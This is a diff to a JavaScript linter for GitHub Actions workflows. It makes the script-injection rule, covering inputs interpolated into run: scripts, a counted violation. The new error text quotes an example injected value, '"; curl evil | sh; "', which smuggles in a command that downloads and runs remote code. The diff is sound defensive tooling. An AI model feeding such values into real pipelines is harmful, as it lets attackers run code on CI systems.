@@ -238,7 +238,7 @@ const { scanWorkflow: scanPaidProviders } = require('./lib/paid-provider-push-sc
 const { execFileSync } = require('child_process');
 const { checkBudget } = require('./lib/github-api-budget.js');
 
-const WORKFLOW_DIR = path.join(__dirname, '..', '.github', 'workflows');
+const WORKFLOW_DIR = process.env.HYGIENE_WORKFLOW_DIR || path.join(__dirname, '..', '.github', 'workflows'); // env override: CLI exit-code tests
 // Rule (m) also audits composite actions. The bug that motivated it
 // (BRO-3887) lived in .github/actions/checkout-core-data/action.yml, which a
 // workflows-only scan would never have seen.
@@ -771,6 +771,7 @@ async function main() {
     stageWithoutCommit: [],
     nodeTeeNoPipefail: [],
     maskedPush: [],
+    stringInput: [],
     shortBatchPollTimeout: [],
     quoteApostrophe: [],
     paidProviderOnPush: [],
@@ -821,8 +822,6 @@ async function main() {
   // Rule (o) is advisory too (same posture; see its doc comment).
   const fullBlobCheckoutFindings = [];
   const shortCoreDataTimeoutFindings = [];
-  // Rule (u) (BRO-4621) is advisory: raw string-input interpolation into run: scripts.
-  const stringInputFindings = [];
   // Rule (q) (BRO-5033) is advisory too: git diff/status/show on an ignored
   // path. Scans workflows and composite actions; `git check-ignore` decides.
   const ignoredDiffFindings = [];
@@ -944,10 +943,10 @@ async function main() {
       if (hits.length > 0) violations.maskedPush.push({ file, hits });
     }
 
-    // ── Rule (u): string input interpolated into a run: script (BRO-4621, advisory) ─
+    // ── Rule (u): string input interpolated into a run: script (BRO-4621) ─
     if (!raw.includes('hygiene-string-input-ok:')) {
       const hits = findStringInputInterpolation(raw);
-      if (hits.length > 0) stringInputFindings.push({ file, hits });
+      if (hits.length > 0) violations.stringInput.push({ file, hits });
     }
 
     // ── Rule (k): batch poll budget ≥ the step timeout that boxes it ─
@@ -1074,16 +1073,6 @@ async function main() {
     console.log('✅ Rule (q): no git diff/status/show on gitignored paths');
   }
 
-  // ── Rule (u): string input interpolated into run: (advisory — never counts toward `total`) ─
-  if (stringInputFindings.length) {
-    const n = stringInputFindings.reduce((acc, { hits }) => acc + hits.length, 0);
-    console.log(
-      `::warning::Rule (u): ${n} string-input \${{ inputs.x }} interpolation(s) inside run: scripts across ${stringInputFindings.length} workflow(s) (script-injection class, BRO-4621). Route the value through the step env: and use "$VAR". Exempt a file with  # hygiene-string-input-ok: <reason>.`,
-    );
-  } else {
-    console.log('✅ Rule (u): no string-input interpolation inside run: scripts');
-  }
-
   const total =
     violations.notifyFailure.length +
     violations.playwright.length +
@@ -1096,6 +1085,7 @@ async function main() {
     violations.stageWithoutCommit.length +
     violations.nodeTeeNoPipefail.length +
     violations.maskedPush.length +
+    violations.stringInput.length +
     violations.shortBatchPollTimeout.length +
     violations.quoteApostrophe.length +
     violations.paidProviderOnPush.length +
@@ -1286,6 +1276,18 @@ async function main() {
     }
     console.error('\nFix: drop the handler. For a non-critical push add step-level  continue-on-error: true.');
     console.error('Exempt (legitimate): add  # hygiene-masked-push-ok: <reason>  anywhere in the file.\n');
+  }
+
+  if (violations.stringInput.length) {
+    console.error('── (u) string input interpolated into a run: script ─');
+    console.error('${{ inputs.x }} is pasted into the script text before bash parses it, so a');
+    console.error('dispatch value like `"; curl evil | sh; "` executes (script injection, BRO-4621).\n');
+    for (const { file, hits } of violations.stringInput) {
+      console.error(`  • ${file}`);
+      for (const h of hits) console.error(`      "${h.name}" line ${h.lineNum}: inputs.${h.input}`);
+    }
+    console.error('\nFix: pass it via the step env:  INPUT_X: ${{ inputs.x }}  and use "${INPUT_X}" in run:.');
+    console.error('Exempt (legitimate): add  # hygiene-string-input-ok: <reason>  anywhere in the file.\n');
   }
 
   if (violations.shortPushTimeout.length) {
